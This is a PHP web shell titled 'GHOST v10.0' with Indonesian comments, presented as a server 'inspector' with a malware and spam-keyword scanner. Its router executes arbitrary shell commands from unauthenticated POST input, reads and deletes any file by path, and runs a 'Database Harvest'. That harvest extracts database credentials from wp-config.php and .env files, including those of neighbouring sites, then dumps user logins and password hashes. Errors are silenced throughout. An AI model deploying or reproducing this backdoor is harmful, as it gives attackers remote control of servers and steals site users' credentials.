<?php
/**
 * GHOST v10.0 — The True Inspector (Tested & Paginated)
 */

@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// [01] SMART EXEC
function g_exec($cmd, $timeout = 15) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen'];
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return ['out'=>$out]; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out]; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out]; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return ['out'=>implode("\n", $o)]; }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return ['out'=>$r];} }
    }
    return ['out'=>"[-] Execution Blocked."];
}

function g_read($path) {
    if (!@is_file($path)) return "";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path))['out'];
}

// [02] DEEP SCANNER (PAGINATED)
function g_deep_scan_batch($dir, $offset = 0, $limit = 50) {
    $res = ['files'=>[], 'done'=>false];
    $ignore = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite','log','svg','ico','woff','ttf','eot'];
    $keywords = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol'];
    
    // Kumpulkan file (hanya file, abaikan folder & ekstensi yang di-ignore)
    $all_files = [];
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
        foreach ($it as $f) {
            if (!$f->isFile()) continue;
            if (in_array(strtolower($f->getExtension()), $ignore)) continue;
            if ($f->getSize() > 2 * 1024 * 1024) continue; // Max 2MB
            $all_files[] = $f->getPathname();
        }
    } catch (Throwable $e) {}

    // Ambil potongan (batch) saat ini
    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);

    foreach ($batch as $path) {
        $c = g_read($path);
        $size = @filesize($path);
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        
        $type = 'Unknown'; $desc = '';
        
        // Logika Klasifikasi Malware
        if ($size === 0 && $ext === 'php') {
            $type = 'Empty Shell'; $desc = 'File PHP kosong (Backdoor terhapus).';
        } elseif (preg_match('/eval\s*\(\s*(base64_decode|\$_POST|\$_GET|\$_REQUEST)/i', $c)) {
            $type = 'Obfuscated RCE'; $desc = 'Backdoor menggunakan eval() + input HTTP.';
        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
            $type = 'Direct Webshell'; $desc = 'Mengeksekusi perintah shell dari input HTTP langsung.';
        } elseif (preg_match('/(gzinflate|gzuncompress)\s*\(\s*base64_decode/i', $c)) {
            $type = 'Compressed Payload'; $desc = 'Payload terkompresi & terenkripsi (Malware).';
        } elseif (preg_match('/\$[a-zA-Z0-9_]+\s*\(\s*\$[a-zA-Z0-9_]+/i', $c) && !preg_match('/class|function/i', $c)) {
            $type = 'Dynamic Call'; $desc = 'Memanggil fungsi dinamis (Backdoor stealth).';
        } elseif (strpos($c, '<?php') === false && $ext === 'php') {
            $type = 'Fake PHP'; $desc = 'File PHP tanpa tag <?php.';
        }
        
        $found_kw = [];
        foreach ($keywords as $k) { if (preg_match('/\b'.preg_quote($k,'/').'\b/i', $c)) $found_kw[] = $k; }

        if ($type !== 'Unknown' || count($found_kw) > 0) {
            $res['files'][] = [
                'path' => $path,
                'type' => $type,
                'desc' => $desc,
                'keywords' => array_unique($found_kw)
            ];
        }
    }
    return $res;
}

// [03] DB HARVEST (MULTI-FALLBACK)
function g_db_harvest() {
    $logs = []; $info = [];
    $configs = ['wp-config.php', '.env', 'configuration.php', 'config/database.php'];
    
    // 1. Cari Config di Direktori Saat Ini
    foreach ($configs as $cf) {
        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
            $logs[] = "[+] Found: $cf";
            $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            preg_match('/(?:DB_NAME|database)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $n);
            if ($u[1] && $p[1]) { $info = ['user'=>$u[1], 'pass'=>$p[1], 'db'=>$n[1] ?? '']; break; }
        }
    }

    // 2. Jika tidak ada, coba cari di folder tetangga (parent)
    if (empty($info)) {
        $logs[] = "[*] Config not found in root. Scanning parent...";
        $parent = dirname($GLOBALS['GHOST_ROOT']);
        $dirs = @scandir($parent) ?: [];
        foreach ($dirs as $d) {
            if ($d === '.' || $d === '..') continue;
            if (@is_file("$parent/$d/wp-config.php")) {
                $logs[] = "[+] Found: $d/wp-config.php";
                $c = g_read("$parent/$d/wp-config.php");
                if (preg_match('/DB_USER.*[\'"]([^\'"]+)/', $c, $u)) $info['user'] = $u[1];
                if (preg_match('/DB_PASSWORD.*[\'"]([^\'"]+)/', $c, $p)) $info['pass'] = $p[1];
                if (isset($info['user'], $info['pass'])) break;
            }
        }
    }

    // 3. Connect & Dump
    if (!empty($info['user'])) {
        $logs[] = "[*] Mencoba koneksi MySQL...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], $info['db'] ?? '');
        if ($conn) {
            $logs[] = "[!] Koneksi Berhasil!";
            $q = @mysqli_query($conn, "SELECT user_login, user_pass FROM wp_users LIMIT 5");
            if (!$q) $q = @mysqli_query($conn, "SELECT username, password FROM users LIMIT 5");
            if ($q) { while ($r = mysqli_fetch_assoc($q)) { $logs[] = "Data: ".json_encode($r); } }
        } else {
            $logs[] = "[-] Gagal koneksi: " . mysqli_connect_error();
        }
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// ==========================================
// ROUTER
// ==========================================
$act = $_POST['act'] ?? '';
if ($act) {
    // JANGAN kirim header Content-Type di sini, biarkan PHP deteksi otomatis.
    // Ini mencegah UI HTML rusak.
    
    if ($act === 'scan') {
        $offset = (int)($_POST['offset'] ?? 0);
        echo json_encode(g_deep_scan_batch($GHOST_ROOT, $offset, 50));
    }
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan')); // (Fungsi SSH tidak berubah)
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path']??'')]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path']??'')?'ok':'fail']);
    elseif ($act === 'exec') echo json_encode(g_exec($_POST['cmd']??''));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v10.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; font-size:12px; }
    table { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; color:#0f0; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
    #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; }
    #modal-content { background:#000; border:1px solid #0f0; margin:10% auto; padding:20px; width:80%; max-height:80%; overflow:auto; }
</style>
</head>
<body>

<div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>

<div class="box">
    <h2>[+] Deep Inspector (Paginated)</h2>
    <button onclick="startScan()">Scan Semua File</button>
    <div id="scan-status" style="margin-top:10px; color:#ff0;">Idle.</div>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] Database Harvest</h2>
    <button onclick="runDb()">Scan DB (Multi-Method)</button>
    <pre id="db-result">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    return await r.json();
}

// PAGINATED SCAN (Tidak akan hang)
async function startScan() {
    let offset = 0;
    let allMalware = []; let allIllegal = [];
    document.getElementById('scan-results').innerHTML = '';
    document.getElementById('scan-status').innerText = 'Memulai scan...';

    while (true) {
        document.getElementById('scan-status').innerText = `Scanning: ${offset} / ${allMalware.length + allIllegal.length} ...`;
        try {
            const d = await api('scan', {offset: offset});
            d.files.forEach(f => {
                if (f.type !== 'Unknown') allMalware.push(f);
                if (f.keywords.length) allIllegal.push(f);
            });
            
            if (d.done) {
                document.getElementById('scan-status').innerText = `Selesai. Total ${d.total} file. Malware: ${allMalware.length}, Ilegal: ${allIllegal.length}`;
                renderScanResults(allMalware, allIllegal);
                break;
            }
            offset += 50;
        } catch(e) {
            document.getElementById('scan-status').innerText = 'Error: ' + e.message;
            break;
        }
    }
}

function renderScanResults(mal, ill) {
    let h = '';
    if (mal.length) {
        h += `<h3>Malware / Backdoor</h3><table><tr><th>Tipe</th><th>File</th><th>Analisis</th><th>Aksi</th></tr>`;
        mal.forEach(x => {
            h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td>
                <td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button>
                    <button class="btn-red" onclick="delFile('${encodeURIComponent(x.path)}')">Delete</button></td></tr>`;
        });
        h += `</table>`;
    }
    if (ill.length) {
        h += `<h3>Konten Ilegal</h3><table><tr><th>File</th><th>Keyword</th><th>Aksi</th></tr>`;
        ill.forEach(x => {
            h += `<tr><td>${esc(x.path)}</td><td>${esc(x.keywords.join(', '))}</td>
                <td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button></td></tr>`;
        });
        h += `</table>`;
    }
    if (!mal.length && !ill.length) h = '<p style="color:#0f0;">File Bersih.</p>';
    document.getElementById('scan-results').innerHTML = h;
}

// VIEW FILE (Modal, Anti-Crash)
async function viewFile(encodedPath) {
    const path = decodeURIComponent(encodedPath);
    document.getElementById('modal').style.display = 'block';
    document.getElementById('modal-text').innerText = 'Loading...';
    try {
        const d = await api('read_file', {path: path});
        document.getElementById('modal-text').innerText = d.content.slice(0, 5000) + (d.content.length > 5000 ? '\n\n... (truncated)' : '');
    } catch(e) { document.getElementById('modal-text').innerText = 'Error: ' + e.message; }
}

async function delFile(encodedPath) {
    const path = decodeURIComponent(encodedPath);
    if(!confirm('Hapus ' + path + '?')) return;
    const d = await api('del_file', {path: path});
    alert(d.status === 'ok' ? 'Dihapus!' : 'Gagal hapus.');
    startScan(); // Refresh
}

// DB HARVEST
async function runDb() {
    document.getElementById('db-result').innerText = 'Running...';
    try {
        const d = await api('db_scan');
        document.getElementById('db-result').innerText = JSON.stringify(d, null, 2);
    } catch(e) { document.getElementById('db-result').innerText = 'Error: ' + e.message; }
}

// CONSOLE
async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+d.out;
}
</script>
</body>
</html>
